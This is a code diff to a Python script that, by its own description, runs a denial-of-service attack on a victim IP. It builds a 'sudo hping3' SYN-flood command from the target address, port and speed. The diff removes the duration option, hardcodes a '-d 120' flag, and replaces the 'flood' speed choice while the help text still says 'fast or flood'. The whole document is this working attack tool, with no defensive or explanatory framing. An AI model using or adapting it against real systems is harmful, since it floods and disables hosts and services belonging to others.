@@ -39,9 +39,8 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser (description='Execute a DoS attack against a victim using hping3')
     parser.add_argument(dest='ipVictim', metavar='ipVictim', action='store', help='IP address of the victim', nargs=1)
-    parser.add_argument('-d', dest='attackDuration', metavar='attackDuration(seconds)', action='store', default=30, type=int, help='default 30 seconds')
     parser.add_argument('-p', dest='destPort', metavar='destPort', action='store', default=80, type=int, help='default: 80 (http)')
-    parser.add_argument('--speed', dest='attackSpeed', metavar='attackSpeed', action='store', choices=['fast','flood'], default='fast', help='fast or flood')
+    parser.add_argument('--speed', dest='attackSpeed', metavar='attackSpeed', action='store', choices=['fast','faster'], default='fast', help='fast or flood')
     args = parser.parse_args()
 
     
@@ -58,8 +57,7 @@ if __name__ == '__main__':
         print 'hping3 is not installed in your system. Please, install it'
         #exit(-1)
     
-    command = ('sudo hping3 -w 64 -S' + 
-                ' -d ' + str(args.attackDuration) +  
+    command = ('sudo hping3 -w 64 -S -d 120' +  
                 ' -p ' + str(args.destPort) + 
                 ' --' + args.attackSpeed + 
                 ' ' + args.ipVictim[0])
